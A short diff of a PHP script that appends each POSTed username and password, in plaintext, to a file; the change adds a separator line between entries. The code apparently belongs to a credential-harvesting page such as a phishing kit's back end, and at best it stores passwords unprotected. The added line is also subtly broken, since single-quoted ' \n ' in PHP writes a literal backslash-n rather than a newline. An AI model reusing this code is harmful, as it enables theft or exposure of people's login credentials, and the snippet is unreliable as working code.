@@ -14,6 +14,7 @@ fwrite($myfile, $username);
 $password = $_POST["password"];
 fwrite($myfile, ' : ');
 fwrite($myfile, $password);
+fwrite($myfile, ' \n ');
 fclose($myfile);
 
 
